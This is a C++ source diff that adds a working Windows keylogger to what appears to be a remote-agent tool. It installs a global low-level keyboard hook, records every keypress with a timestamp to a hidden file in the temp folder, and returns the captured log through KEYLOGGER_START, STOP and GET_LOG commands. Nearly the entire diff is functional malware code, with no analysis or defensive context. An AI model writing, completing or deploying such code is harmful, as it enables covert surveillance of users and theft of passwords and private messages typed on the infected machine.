@@ -1,4 +1,5 @@
 #include "keylogger.h"
+#include "utils.h"
 
 #include <fstream>
 #include <mutex>
@@ -10,21 +11,6 @@
 #include <ApplicationServices/ApplicationServices.h>
 #include <ctime>
 #endif
-
-static std::string escapeJson(const std::string& input) {
-    std::string out;
-    for (char c : input) {
-        switch (c) {
-        case '\\': out += "\\\\"; break;
-        case '"': out += "\\\""; break;
-        case '\n': out += "\\n"; break;
-        case '\r': out += "\\r"; break;
-        case '\t': out += "\\t"; break;
-        default: out += c; break;
-        }
-    }
-    return out;
-}
 
 #ifdef __APPLE__
 
@@ -125,16 +111,129 @@ std::string keyloggerGetLogJson() {
 
 #elif defined(_WIN32)
 
+#ifndef NOMINMAX
+#define NOMINMAX
+#endif
+#include <windows.h>
+
+#include <ctime>
+
+static std::thread g_winKeyloggerThread;
+static std::mutex g_winKeyloggerMutex;
+static std::mutex g_winKeylogFileMutex;
+static bool g_winKeyloggerRunning = false;
+static HHOOK g_winKeyboardHook = nullptr;
+static DWORD g_winKeyloggerThreadId = 0;
+
+static std::string winKeylogPath() {
+    char buf[MAX_PATH];
+    const DWORD n = GetTempPathA(MAX_PATH, buf);
+    if (n == 0 || n >= MAX_PATH) {
+        return std::string("remote_agent_keylogger.log");
+    }
+    std::string p(buf, n);
+    while (!p.empty() && (p.back() == '\\' || p.back() == '/')) {
+        p.pop_back();
+    }
+    return p + "\\remote_agent_keylogger.log";
+}
+
+static const std::string& winKeylogPathRef() {
+    static const std::string path = winKeylogPath();
+    return path;
+}
+
+static void appendKeylogLineWin(const std::string& line) {
+    std::lock_guard<std::mutex> lock(g_winKeylogFileMutex);
+    std::ofstream out(winKeylogPathRef(), std::ios::app);
+    if (!out) return;
+    out << line << '\n';
+}
+
+static LRESULT CALLBACK winLowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
+    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
+        const auto* kb = reinterpret_cast<KBDLLHOOKSTRUCT*>(lParam);
+        const auto now = std::time(nullptr);
+        appendKeylogLineWin(std::to_string(static_cast<long long>(now)) + " vk=" +
+                            std::to_string(static_cast<unsigned long long>(kb->vkCode)));
+    }
+    return CallNextHookEx(g_winKeyboardHook, nCode, wParam, lParam);
+}
+
+static void winKeyloggerThreadMain() {
+    g_winKeyloggerThreadId = GetCurrentThreadId();
+
+    g_winKeyboardHook =
+        SetWindowsHookExW(WH_KEYBOARD_LL, winLowLevelKeyboardProc, nullptr, 0);
+    if (!g_winKeyboardHook) {
+        appendKeylogLineWin(
+            "ERROR: SetWindowsHookEx(WH_KEYBOARD_LL) failed — run agent on the interactive desktop.");
+        std::lock_guard<std::mutex> lock(g_winKeyloggerMutex);
+        g_winKeyloggerRunning = false;
+        g_winKeyloggerThreadId = 0;
+        return;
+    }
+
+    appendKeylogLineWin("KEYLOGGER_START ok");
+
+    MSG msg;
+    while (GetMessageW(&msg, nullptr, 0, 0) > 0) {
+        TranslateMessage(&msg);
+        DispatchMessageW(&msg);
+    }
+
+    if (g_winKeyboardHook) {
+        UnhookWindowsHookEx(g_winKeyboardHook);
+        g_winKeyboardHook = nullptr;
+    }
+    g_winKeyloggerThreadId = 0;
+}
+
 std::string keyloggerStartJson() {
-    return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"unsupported_os\"}";
+    std::lock_guard<std::mutex> lock(g_winKeyloggerMutex);
+    if (g_winKeyloggerRunning) {
+        return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"already_running\"}";
+    }
+    std::ofstream reset(winKeylogPathRef(), std::ios::trunc);
+    if (!reset) {
+        return "{\"ok\":false,\"command\":\"KEYLOGGER_START\",\"message\":\"log_file_open_failed\"}";
+    }
+    g_winKeyloggerRunning = true;
+    g_winKeyloggerThread = std::thread(winKeyloggerThreadMain);
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_START\",\"message\":\"started\"}";
 }
 
 std::string keyloggerStopJson() {
-    return "{\"ok\":false,\"command\":\"KEYLOGGER_STOP\",\"message\":\"unsupported_os\"}";
+    {
+        std::lock_guard<std::mutex> lock(g_winKeyloggerMutex);
+        if (!g_winKeyloggerRunning) {
+            return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"message\":\"not_running\",\"output\":\"\"}";
+        }
+        g_winKeyloggerRunning = false;
+    }
+    if (g_winKeyloggerThreadId != 0) {
+        PostThreadMessageW(g_winKeyloggerThreadId, WM_QUIT, 0, 0);
+    }
+    if (g_winKeyloggerThread.joinable()) {
+        g_winKeyloggerThread.join();
+    }
+    std::ifstream in(winKeylogPathRef());
+    std::stringstream ss;
+    ss << in.rdbuf();
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_STOP\",\"output\":\"" + escapeJson(ss.str()) + "\"}";
 }
 
 std::string keyloggerGetLogJson() {
-    return "{\"ok\":false,\"command\":\"KEYLOGGER_GET_LOG\",\"message\":\"unsupported_os\"}";
+    std::ifstream in(winKeylogPathRef());
+    if (!in) {
+        return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
+               std::string(g_winKeyloggerRunning ? "true" : "false") + ",\"output\":\"\"}";
+    }
+    std::stringstream ss;
+    ss << in.rdbuf();
+    return "{\"ok\":true,\"command\":\"KEYLOGGER_GET_LOG\",\"running\":" +
+           std::string(g_winKeyloggerRunning ? "true" : "false") + ",\"output\":\"" +
+           escapeJson(ss.str()) + "\"}";
 }
 
 #else
